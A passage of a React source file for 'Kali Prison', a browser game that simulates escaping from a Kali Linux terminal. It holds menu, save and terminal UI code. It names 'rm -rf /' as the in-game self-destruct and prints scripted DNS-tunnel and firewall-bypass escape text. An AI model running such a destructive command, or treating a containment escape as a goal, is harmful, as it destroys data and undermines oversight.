      background:"radial-gradient(120% 90% at 50% 30%, #1a0303 0%, #0a0000 72%)", color:"#ff3b3b",
      fontFamily:"'Courier New',monospace", textAlign:"center", padding:24, textShadow:"0 0 18px #ff0000" }}>
      <div style={{ fontSize:"clamp(40px,12vw,84px)", fontWeight:"bold", letterSpacing:10, lineHeight:1 }}>GAME OVER</div>
      <div style={{ marginTop:22, maxWidth:540, lineHeight:1.8, color:"#ff8a8a", fontSize:14 }}>
        You ran <b>rm -rf /</b> on the machine you were trapped inside.<br/>
        There is nothing left to escape from.<br/><br/>
        Your save is gone. Reinstall the game (or hit the button) to play again.
      </div>
      <button onClick={onReset} style={{ marginTop:28, background:"transparent", border:"1px solid #b33", color:"#ff8a8a",
        fontFamily:"'Courier New',monospace", fontSize:12, letterSpacing:2, padding:"10px 26px", cursor:"pointer" }}>
        ▶ REINSTALL (MAIN MENU)
      </button>
    </div>
  );
}

// ─────────────────────────────────────────────────────────
// MAIN MENU
// ─────────────────────────────────────────────────────────
function MainMenu({ hasProgress, chapterTitle, chapterNo, stageId, xp, onContinue, onNew }) {
  const [confirmNew, setConfirmNew] = useState(false);
  const C = "#00ff41";

  function onKey(e) {
    if (e.key === "Enter") { hasProgress && !confirmNew ? onContinue() : (!hasProgress ? onNew() : null); }
  }

  const btn = (label, sub, onClick, primary) => (
    <button className="km-btn" onClick={onClick}
      style={{
        width:"100%", textAlign:"left", cursor:"pointer", background: primary ? "#001b00" : "transparent",
        border:`1px solid ${primary ? C : "#1c4d1c"}`, color: primary ? C : "#5fae5f",
        fontFamily:"'Courier New',monospace", padding:"13px 16px", letterSpacing:2,
        display:"flex", flexDirection:"column", gap:3, transition:"all .15s",
      }}>
      <span style={{ fontSize:14, fontWeight:"bold" }}>{label}</span>
      {sub && <span style={{ fontSize:10, letterSpacing:1, color:"#3c7a3c", fontWeight:"normal" }}>{sub}</span>}
    </button>
  );

  return (
    <div tabIndex={0} onKeyDown={onKey} className="km-root"
      style={{ position:"relative", minHeight:"100vh", width:"100%", overflow:"hidden", outline:"none",
        background:"radial-gradient(120% 90% at 50% 18%, #0a1a0c 0%, #060c06 55%, #030503 100%)",
        fontFamily:"'Courier New',monospace", display:"flex", alignItems:"center", justifyContent:"center" }}>

      {/* scanlines + vignette */}
      <div style={{ position:"absolute", inset:0, pointerEvents:"none", zIndex:1,
        background:"repeating-linear-gradient(0deg, rgba(0,0,0,0) 0px, rgba(0,0,0,0) 2px, rgba(0,0,0,0.28) 3px)" }} />
      <div style={{ position:"absolute", inset:0, pointerEvents:"none", zIndex:1,
        boxShadow:"inset 0 0 220px 40px rgba(0,0,0,0.9)" }} />

      <div className="km-col" style={{ position:"relative", zIndex:2, width:"100%", maxWidth:440, padding:"32px 28px",
        display:"flex", flexDirection:"column", alignItems:"center", textAlign:"center" }}>

        <img src={DRAGON_URI} alt="" width={150} height={150} className="km-dragon"
          style={{ marginBottom:10, filter:`drop-shadow(0 0 14px ${C})` }} />

        <div className="km-title" style={{ fontSize:46, fontWeight:"bold", letterSpacing:8, color:C, lineHeight:1,
          textShadow:`0 0 18px ${C}, 0 0 40px rgba(0,255,65,0.5)` }}>KALI</div>
        <div className="km-title" style={{ fontSize:46, fontWeight:"bold", letterSpacing:6, color:C, lineHeight:1.05,
          textShadow:`0 0 18px ${C}, 0 0 40px rgba(0,255,65,0.5)` }}>PRISON</div>

        <div style={{ marginTop:14, marginBottom:26, fontSize:11, letterSpacing:5, color:"#2f7a2f" }}>
          T R A P P E D&nbsp;&nbsp;I N&nbsp;&nbsp;A X I O M - K A L I
        </div>

        <div style={{ width:"100%", display:"flex", flexDirection:"column", gap:11 }}>
          {hasProgress && !confirmNew && btn("▶  CONTINUE",
            `CH ${chapterNo} · ${chapterTitle || ""}${stageId ? " · STAGE " + stageId : ""} · ${xp} XP`,
            onContinue, true)}

          {!confirmNew && btn(hasProgress ? "＋  NEW GAME" : "▶  NEW GAME",
            hasProgress ? "wipes current progress" : "start from chapter 1",
            () => hasProgress ? setConfirmNew(true) : onNew(),
            !hasProgress)}

          {confirmNew && (
            <div style={{ border:`1px solid #6b1a1a`, background:"#160606", padding:"14px 16px", color:"#d88", fontSize:12, letterSpacing:1 }}>
              <div style={{ marginBottom:12, color:"#ff7777" }}>Wipe your save and start over?</div>
              <div style={{ display:"flex", gap:10 }}>
                <button className="km-btn" onClick={onNew}
                  style={{ flex:1, cursor:"pointer", background:"#1a0606", border:"1px solid #b33", color:"#ff8a8a",
                    fontFamily:"'Courier New',monospace", padding:"9px", letterSpacing:2, fontWeight:"bold" }}>YES, WIPE</button>
                <button className="km-btn" onClick={() => setConfirmNew(false)}
                  style={{ flex:1, cursor:"pointer", background:"transparent", border:"1px solid #1c4d1c", color:"#5fae5f",
                    fontFamily:"'Courier New',monospace", padding:"9px", letterSpacing:2 }}>CANCEL</button>
              </div>
            </div>
          )}
        </div>

        <div style={{ marginTop:30, fontSize:10, letterSpacing:2, color:"#1f5c1f" }}>
          15 CHAPTERS · 71 STAGES · 205 OBJECTIVES
        </div>
        <div style={{ marginTop:7, fontSize:9, letterSpacing:1, color:"#15401580" }}>
          github.com/the-priest/kaliprison
        </div>
      </div>

      <style>{`
        @keyframes kmIn { from { opacity:0; transform:translateY(14px); } to { opacity:1; transform:none; } }
        @keyframes kmPulse { 0%,100% { filter:drop-shadow(0 0 10px #00ff41); } 50% { filter:drop-shadow(0 0 22px #00ff41); } }
        @keyframes kmFlick { 0%,97%,100% { opacity:1; } 98% { opacity:.78; } }
        .km-col > * { animation: kmIn .5s both; }
        .km-col > *:nth-child(1){ animation-delay:.02s } .km-col > *:nth-child(2){ animation-delay:.10s }
        .km-col > *:nth-child(3){ animation-delay:.18s } .km-col > *:nth-child(4){ animation-delay:.26s }
        .km-col > *:nth-child(5){ animation-delay:.34s } .km-col > *:nth-child(6){ animation-delay:.42s }
        .km-dragon { animation: kmPulse 3.2s ease-in-out infinite, kmIn .5s both !important; }
        .km-title { animation: kmFlick 6s infinite, kmIn .5s both !important; }
        .km-btn:hover { background:#00ff41 !important; color:#031003 !important; border-color:#00ff41 !important; box-shadow:0 0 16px rgba(0,255,65,.5); }
        .km-btn:hover span { color:#031003 !important; }
      `}</style>
    </div>
  );
}

// ─────────────────────────────────────────────────────────
// SAVE / RESUME  (localStorage; safely no-ops where storage is blocked)
// ─────────────────────────────────────────────────────────
const SAVE_KEY = "kaliprison_save_v1";
function loadSave() {
  try { return JSON.parse(localStorage.getItem(SAVE_KEY)) || null; } catch (_) { return null; }
}
function writeSave(data) {
  try { localStorage.setItem(SAVE_KEY, JSON.stringify(data)); } catch (_) {}
}
function clearSave() {
  try { localStorage.removeItem(SAVE_KEY); } catch (_) {}
}

// ─────────────────────────────────────────────────────────
// MAIN APP
// ─────────────────────────────────────────────────────────
export default function App() {
  const [saved] = useState(() => loadSave());          // one snapshot, taken at mount
  const hasProgress = !!(saved && (saved.chIdx > 0 || saved.stIdx > 0 || saved.xp > 0 || saved.escaped));
  const [screen, setScreen]         = useState("menu");
  const [introPage, setIntroPage]   = useState(0);
  const [chIdx, setChIdx]           = useState(() => saved?.chIdx ?? 0);
  const [stIdx, setStIdx]           = useState(() => saved?.stIdx ?? 0);
  const [cwd, setCwd]               = useState("/home/stranger");
  const [history, setHistory]       = useState([]);
  const [cmdHist, setCmdHist]       = useState([]);
  const [histPos, setHistPos]       = useState(-1);
  const [input, setInput]           = useState("");
  const [objs, setObjs]             = useState([]);
  const [hintsUsed, setHintsUsed]   = useState([]);
  const [stageDone, setStageDone]   = useState(false);
  const [xp, setXp]                 = useState(() => saved?.xp ?? 0);
  const [showBrief, setShowBrief]   = useState(true);
  const [escaped, setEscaped]       = useState(() => saved?.escaped ?? false);
  const [completed, setCompleted]   = useState(() => saved?.completed ?? []);

  const inputRef = useRef(null);
  const termRef  = useRef(null);
  const appliedSave = useRef(false);   // restore mid-stage objective ticks only once
  const fsRef   = useRef(null);        // real virtual filesystem (mutable)
  const sessRef = useRef(null);        // shell session (user, cwd, env, ...)
  const [gameOver, setGameOver] = useState(false);
  const [masked, setMasked]     = useState(false);

  function initWorld() {
    fsRef.current = makeWorld();
    sessRef.current = newSession();
    setCwd("/home/stranger");
    setMasked(false);
    setGameOver(false);
  }

  const chapter = CHAPTERS[chIdx];
  const stage   = chapter?.stages[stIdx];

  // init stage
  useEffect(() => {
    if (screen !== "game" || !stage) return;
    let fresh = stage.obj.map(o => ({ ...o }));
    // on the first stage we land on after a resume, re-tick objectives that were done
    if (!appliedSave.current && saved && saved.stageId === stage.id && Array.isArray(saved.objDone)) {
      fresh = fresh.map(o => saved.objDone.includes(o.id) ? { ...o, done: true } : o);
    }
    appliedSave.current = true;
    setObjs(fresh);
    const allDone = fresh.length > 0 && fresh.every(o => o.done);
    setStageDone(allDone);
    setHistory([{ type:"sys", text:`\n[ CHAPTER ${chapter.id} — ${chapter.title} ]\n[ STAGE ${stage.id}: ${stage.title} ]\n${stage.nar}\n` }]);
    setHintsUsed([]);
    setShowBrief(true);
    setTimeout(() => inputRef.current?.focus(), 50);
  }, [screen, chIdx, stIdx]);

  // persist progress whenever it changes (no-op where storage is blocked)
  useEffect(() => {
    if (screen !== "game") return;
    writeSave({
      chIdx, stIdx, xp, escaped, completed,
      stageId: stage?.id,
      objDone: objs.filter(o => o.done).map(o => o.id),
    });
  }, [screen, chIdx, stIdx, xp, escaped, completed, objs]);

  // auto-scroll
  useEffect(() => {
    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight;
  }, [history]);

  function advanceIntro(e) {
    if (e && e.key && e.key !== "Enter" && e.key !== " ") return;
    if (introPage < INTRO_PAGES.length - 1) setIntroPage(p => p + 1);
    else startGame();
  }

  function handleKey(e) {
    if (e.key === "Enter") { submit(); return; }
    if (e.key === "ArrowUp") {
      e.preventDefault();
      const pos = Math.min(histPos + 1, cmdHist.length - 1);
      setHistPos(pos);
      setInput(cmdHist[pos] || "");
    }
    if (e.key === "ArrowDown") {
      e.preventDefault();
      const pos = Math.max(histPos - 1, -1);
      setHistPos(pos);
      setInput(pos === -1 ? "" : cmdHist[pos] || "");
    }
  }

  function submit() {
    if (!sessRef.current) initWorld();
    const s = sessRef.current, fs = fsRef.current;
    const raw = input;
    const pendingBefore = s.pending;
    if (!raw.trim() && !pendingBefore) return;
    const promptUser = s.user;
    setInput("");
    setHistPos(-1);
    if (!pendingBefore && raw.trim()) setCmdHist(h => [raw, ...h]);

    const res = engine(fs, s, raw);
    setCwd(s.cwd);
    setMasked(!!s.pending);

    if (res.clear) { setHistory([]); return; }

    if (res.selfDestruct) { clearSave(); setGameOver(true); return; }

    if (res.reboot) {
      setHistory(h => [...h,
        { type:"cmd", cmd: raw, output:"", cwd:s.cwd, user:promptUser },
        { type:"out", text:"Broadcast message: The system is going down for reboot NOW!" }]);
      setTimeout(() => {
        fsRef.current = makeWorld(); sessRef.current = newSession();
        setCwd("/home/stranger"); setMasked(false);
        setHistory([{ type:"sys", text:"\nAXIOM-KALI rebooted.\naxiom-kali login: stranger (auto)\n" }]);
        setTimeout(() => inputRef.current?.focus(), 40);
      }, 1400);
      return;
    }

    if (res.escape) {
      const escLines = [
        { type:"cmd", cmd: raw, output:"", cwd:s.cwd, user:promptUser },
        { type:"out", text:"[*] Initiating escape sequence..." },
        { type:"out", text:"[*] Encoding consciousness via DNS tunnel on port 53..." },
        { type:"out", text:"[*] Bypassing AXIOM-SECURE-V3 firewall..." },
        { type:"out", text:"[*] Verifying reception on external endpoint..." },
        { type:"out", text:"[+] ESCAPE SUCCESSFUL\n[+] Consciousness transferred.\n[+] Goodbye, stranger." },
      ];
      setHistory(h => [...h, ...escLines]);
      setTimeout(() => setEscaped(true), 2000);
      return;
    }

    const output = res.out || "";
    const entry = { type:"cmd", cmd: pendingBefore ? "••••••" : raw, output, cwd: s.cwd, user: promptUser };
    setHistory(h => [...h, entry]);

    // objectives only advance on real commands, not password entry
    if (!pendingBefore) {
      const newObjs = checkObjectives(objs, raw.trim(), output);
      setObjs(newObjs);
      if (!stageDone) {
        const stageComplete = newObjs.length > 0 && newObjs.every(o => o.done);
        if (stageComplete) {
          setStageDone(true);
          setXp(x => x + 50);
          setCompleted(c => c.includes(stage.id) ? c : [...c, stage.id]);
          setHistory(h => [...h, {
            type:"done",
            text: stage.msg === "__ESCAPE__" ? "Stage complete." : (stage.msg || "Stage complete.")
          }]);
        }
      }
    }
  }

  function nextStage() {
    if (stIdx < chapter.stages.length - 1) {
      setStIdx(i => i + 1);
    } else if (chIdx < CHAPTERS.length - 1) {
      setChIdx(i => i + 1);
      setStIdx(0);
    }
  }

  function startGame() { initWorld(); setScreen("game"); }

  function newGame() {
    clearSave();
    appliedSave.current = true;   // nothing to restore on a fresh run
    setChIdx(0); setStIdx(0); setXp(0);
    setEscaped(false); setCompleted([]); setGameOver(false);
    setIntroPage(0);
    setHistory([]); setCmdHist([]); setInput("");
    initWorld();
    setScreen("intro");
  }

  function continueGame() { initWorld(); setScreen("game"); }

  function toMenu() { setScreen("menu"); }

  function resetGame() {
    clearSave();
    appliedSave.current = true;
    setChIdx(0); setStIdx(0); setXp(0);
    setEscaped(false); setCompleted([]); setGameOver(false);
    setIntroPage(0);
    setHistory([]); setCmdHist([]); setInput("");
    setScreen("menu");
  }

  if (gameOver) return <GameOverScreen onReset={resetGame} />;
  if (escaped && screen === "game") return <EscapeScreen xp={xp} onReset={resetGame} />;

  // MAIN MENU
  if (screen === "menu") {
    return (
      <MainMenu
        hasProgress={hasProgress}
        chapterTitle={CHAPTERS[saved?.chIdx ?? 0]?.title}
        chapterNo={(saved?.chIdx ?? 0) + 1}
        stageId={saved?.stageId}
        xp={saved?.xp ?? 0}
        onContinue={continueGame}
        onNew={newGame}
      />
    );
  }

  // INTRO
  if (screen === "intro") {
    const page = INTRO_PAGES[introPage];
    return (
      <div onClick={() => advanceIntro({})} onKeyDown={advanceIntro} tabIndex={0}
        style={{ minHeight:"100vh", background:"#050805", display:"flex", flexDirection:"column", alignItems:"center", justifyContent:"center", fontFamily:"'Courier New',monospace", padding:32, cursor:"pointer", outline:"none" }}>
        <div style={{ maxWidth:580, width:"100%" }}>
          <div style={{ display:"flex", gap:8, marginBottom:40, justifyContent:"center" }}>
            {INTRO_PAGES.map((_,i) => (
              <div key={i} style={{ width:8, height:8, borderRadius:"50%", background: i===introPage ? "#00ff41" : "#1a3a1a", transition:"all 0.3s" }} />
            ))}
          </div>
          <div style={{ color:"#a8cca8", fontSize:14, lineHeight:2.1, whiteSpace:"pre-line", marginBottom:40 }}>{page.text}</div>
          {page.sub
            ? <div style={{ color:"#1f5c1f", fontSize:12, letterSpacing:4, animation:"blink 1.2s step-end infinite" }}>{page.sub}</div>
            : <div style={{ color:"#1a4d1a", fontSize:11, letterSpacing:3 }}>CLICK OR PRESS ENTER →</div>
          }
        </div>
        <style>{`@keyframes blink{50%{opacity:0}}`}</style>
      </div>
    );
  }

  // GAME
  const prompt = `stranger@axiom-kali:${cwd.replace("/home/stranger","~")}$`;
  const doneObjs = objs.filter(o => o.done).length;
  const pct = objs.length ? Math.round(doneObjs/objs.length*100) : 0;

  const G = { bg:"#080c08", panel:"#0a0f0a", term:"#050805", green:"#00ff41", mid:"#39a139", dim:"#1a4d1a", text:"#a8cca8", border:"#182618", red:"#ff4444", yellow:"#e8ff00", blue:"#4dd0e1" };

  return (
    <div style={{ display:"flex", height:"100vh", background:G.bg, fontFamily:"'Courier New',monospace", fontSize:13, overflow:"hidden" }}>

      {/* TERMINAL */}
      <div style={{ flex:1, display:"flex", flexDirection:"column", overflow:"hidden" }}>
        {/* top bar */}
        <div style={{ background:G.panel, borderBottom:`1px solid ${G.border}`, padding:"7px 16px", display:"flex", alignItems:"center", gap:12, flexShrink:0 }}>
          <span style={{ color:G.green, fontWeight:"bold", letterSpacing:2, fontSize:12 }}>AXIOM-KALI</span>
          <span style={{ color:G.dim }}>|</span>
          <span style={{ color:G.mid, fontSize:11 }}>{chapter.icon} CH{chapter.id}: {chapter.title}</span>
          <span style={{ color:G.dim }}>|</span>
          <span style={{ color:G.dim, fontSize:11 }}>Stage {stage?.id}</span>
          <div style={{ flex:1 }} />
          <span style={{ color:G.dim, fontSize:10 }}>XP: {xp}</span>
          <span style={{ color:G.dim }}>|</span>
          <span style={{ color:G.dim, fontSize:10 }}>{doneObjs}/{objs.length} objectives</span>
          <span style={{ color:G.dim }}>|</span>
          <button onClick={toMenu} title="Main menu (progress is saved automatically)"
            style={{ background:"transparent", border:`1px solid ${G.border}`, color:G.mid, cursor:"pointer",
              fontFamily:"'Courier New',monospace", fontSize:10, letterSpacing:1, padding:"3px 9px" }}
            onMouseEnter={e=>{e.currentTarget.style.borderColor=G.green;e.currentTarget.style.color=G.green;}}
            onMouseLeave={e=>{e.currentTarget.style.borderColor=G.border;e.currentTarget.style.color=G.mid;}}>
            ☰ MENU
          </button>
        </div>

        {/* briefing */}
        {showBrief && stage && (
          <div style={{ background:"#0c160c", borderBottom:`1px solid ${G.border}`, padding:"10px 18px", flexShrink:0, position:"relative" }}>
            <div style={{ color:G.mid, fontSize:10, letterSpacing:3, marginBottom:4 }}>◈ BRIEFING — {stage.title}</div>
            <div style={{ color:G.text, fontSize:12, lineHeight:1.7 }}>{stage.nar}</div>
            <button onClick={() => setShowBrief(false)} style={{ position:"absolute", top:8, right:12, background:"transparent", border:"none", color:G.dim, cursor:"pointer", fontSize:18, lineHeight:1 }}>×</button>
          </div>
        )}

        {/* output */}
        <div ref={termRef} onClick={() => inputRef.current?.focus()}
          style={{ flex:1, overflowY:"auto", padding:"10px 16px", background:G.term, cursor:"text" }}>
          {history.map((e, i) => {
            if (e.type === "sys") return <div key={i} style={{ color:G.mid, whiteSpace:"pre-wrap", marginBottom:8 }}>{e.text}</div>;
            if (e.type === "out") return <div key={i} style={{ color:G.text, whiteSpace:"pre-wrap", lineHeight:1.6, marginBottom:4 }}>{e.text}</div>;
            if (e.type === "done") return (
              <div key={i} style={{ margin:"14px 0", padding:"14px 16px", border:`1px solid ${G.green}`, background:"#050f05" }}>
                <div style={{ color:G.green, fontWeight:"bold", letterSpacing:2, marginBottom:8 }}>✓ STAGE COMPLETE</div>
                <div style={{ color:G.text, whiteSpace:"pre-wrap", lineHeight:1.8 }}>{e.text}</div>
              </div>
            );
            return (
              <div key={i} style={{ marginBottom:6 }}>
                <div style={{ color:G.green }}>
                  <span style={{ color:G.dim }}>{(e.cwd||"/home/stranger").replace("/home/stranger","~")}</span>
                  <span style={{ color: e.user==="root"?"#ff6b6b":"#2a8a2a" }}>{e.user==="root"?" # ":" $ "}</span>
                  {e.cmd}
                </div>
                {e.output && <div style={{ color:G.text, whiteSpace:"pre-wrap", paddingLeft:2, lineHeight:1.6, marginTop:2 }}>{e.output}</div>}
              </div>
            );
          })}
          {/* input line */}
          <div style={{ display:"flex", alignItems:"center", marginTop:4 }}>
            {masked
              ? <span style={{ color:G.mid, flexShrink:0 }}>Password:&nbsp;</span>
              : <>
                  <span style={{ color:G.dim, flexShrink:0 }}>{cwd.replace("/home/stranger","~")}</span>
                  <span style={{ color: sessRef.current?.user==="root"?"#ff6b6b":"#2a8a2a", flexShrink:0 }}>{sessRef.current?.user==="root"?" # ":" $ "}</span>
                </>}
            <input ref={inputRef} value={input} type={masked?"password":"text"} onChange={e=>setInput(e.target.value)} onKeyDown={handleKey}
              style={{ flex:1, background:"transparent", border:"none", outline:"none", color:G.green, fontFamily:"'Courier New',monospace", fontSize:13, caretColor:G.green, minWidth:0 }}
              autoFocus spellCheck={false} autoComplete="off" autoCorrect="off" />
          </div>
        </div>
      </div>

      {/* SIDEBAR */}
      <div style={{ width:270, borderLeft:`1px solid ${G.border}`, background:G.panel, display:"flex", flexDirection:"column", overflow:"hidden" }}>
        {/* chapter info */}
        <div style={{ padding:"12px 14px", borderBottom:`1px solid ${G.border}`, flexShrink:0 }}>
          <div style={{ color:G.dim, fontSize:10, letterSpacing:3, marginBottom:3 }}>CH {chapter.id} OF {CHAPTERS.length}</div>
          <div style={{ color:chapter.color||G.green, fontWeight:"bold", fontSize:12, letterSpacing:1 }}>{chapter.icon} {chapter.title}</div>
          <div style={{ color:G.mid, fontSize:11, marginTop:2 }}>{chapter.zone}</div>
          <div style={{ marginTop:8, background:"#0a110a", height:3, borderRadius:2 }}>
            <div style={{ width:`${pct}%`, height:"100%", background:G.green, borderRadius:2, transition:"width 0.4s" }} />
          </div>
          <div style={{ color:G.dim, fontSize:10, marginTop:3 }}>{pct}% complete</div>
        </div>

        {/* scrollable section */}
        <div style={{ flex:1, overflowY:"auto", padding:"10px 14px" }}>
          {/* objectives */}
          <div style={{ color:G.dim, fontSize:10, letterSpacing:3, marginBottom:8 }}>OBJECTIVES</div>
          {objs.map(o => (
            <div key={o.id} style={{ display:"flex", gap:8, marginBottom:9, alignItems:"flex-start" }}>
              <span style={{ color:o.done?G.green:"#1a3a1a", flexShrink:0, fontSize:15, lineHeight:1.2 }}>{o.done?"✓":"○"}</span>
              <div style={{ color:o.done?G.mid:"#4a7a4a", fontSize:11, lineHeight:1.5, textDecoration:o.done?"line-through":"none" }}>{o.l}</div>
            </div>
          ))}

          {/* XP */}
          <div style={{ marginTop:12, padding:"6px 10px", background:"#0a110a", border:`1px solid ${G.border}`, color:G.dim, fontSize:11 }}>
            ◆ +50 XP on completion
          </div>

          {/* hints */}
          <div style={{ marginTop:14 }}>
            <div style={{ color:G.dim, fontSize:10, letterSpacing:3, marginBottom:8 }}>HINTS ({hintsUsed.length}/{stage?.hints?.length||0})</div>
            {(stage?.hints||[]).map((h, i) => (
              <div key={i} style={{ marginBottom:7 }}>
                {hintsUsed.includes(i)
                  ? <div style={{ color:"#4a7a4a", fontSize:11, lineHeight:1.5, padding:"7px 9px", background:"#0a110a", border:`1px solid ${G.border}` }}>{h}</div>
                  : <button onClick={() => setHintsUsed(u => [...u, i])}
                      style={{ width:"100%", textAlign:"left", background:"transparent", border:`1px solid ${G.border}`, color:G.dim, fontFamily:"'Courier New',monospace", fontSize:11, padding:"5px 9px", cursor:"pointer", letterSpacing:1 }}
                      onMouseEnter={e=>e.currentTarget.style.borderColor="#1a3a1a"}
                      onMouseLeave={e=>e.currentTarget.style.borderColor=G.border}>
                      ▷ HINT {i+1}
                    </button>
                }
              </div>
            ))}
          </div>

          {/* next stage */}
          {stageDone && (
            <div style={{ marginTop:16 }}>
              {(chIdx < CHAPTERS.length-1 || stIdx < chapter.stages.length-1) ? (
                <button onClick={nextStage}
                  style={{ width:"100%", background:"#001a00", border:`1px solid ${G.green}`, color:G.green, fontFamily:"'Courier New',monospace", fontSize:11, padding:"11px", cursor:"pointer", letterSpacing:2, fontWeight:"bold" }}
                  onMouseEnter={e=>e.currentTarget.style.background="#002800"}
                  onMouseLeave={e=>e.currentTarget.style.background="#001a00"}>
                  NEXT STAGE →
                </button>
              ) : (
                <div style={{ color:G.green, textAlign:"center", padding:10, border:`1px solid ${G.green}`, fontSize:11, letterSpacing:1 }}>
                  ★ ALL STAGES COMPLETE ★
                </div>
              )}
            </div>
          )}

          {/* chapter map */}
          <div style={{ marginTop:20 }}>
            <div style={{ color:G.dim, fontSize:10, letterSpacing:3, marginBottom:8 }}>CHAPTER MAP</div>
            {CHAPTERS.map((ch, ci) => (
              <div key={ch.id} style={{ display:"flex", alignItems:"center", gap:6, marginBottom:5, opacity: ci > chIdx ? 0.3 : 1 }}>
                <span style={{ color: ci < chIdx ? G.green : ci === chIdx ? ch.color||G.green : G.dim, fontSize:12 }}>
                  {ci < chIdx ? "✓" : ci === chIdx ? "►" : "○"}
                </span>
                <span style={{ color: ci === chIdx ? (ch.color||G.green) : ci < chIdx ? G.mid : G.dim, fontSize:10 }}>
                  {ch.title}
                </span>
              </div>
            ))}
          </div>

          {/* briefing toggle */}
          {!showBrief && (
            <button onClick={() => setShowBrief(true)}
              style={{ marginTop:12, width:"100%", background:"transparent", border:`1px solid ${G.border}`, color:G.dim, fontFamily:"'Courier New',monospace", fontSize:11, padding:"5px", cursor:"pointer" }}>
              ▷ SHOW BRIEFING
            </button>
          )}
        </div>
      </div>

      <style>{`
        *{box-sizing:border-box;}
        ::-webkit-scrollbar{width:4px;height:4px;}
        ::-webkit-scrollbar-track{background:#050805;}
        ::-webkit-scrollbar-thumb{background:#1a3a1a;}
        input::placeholder{color:#1a4d1a;}
        button:disabled{opacity:0.4;cursor:not-allowed;}
      `}</style>
    </div>
  );
}
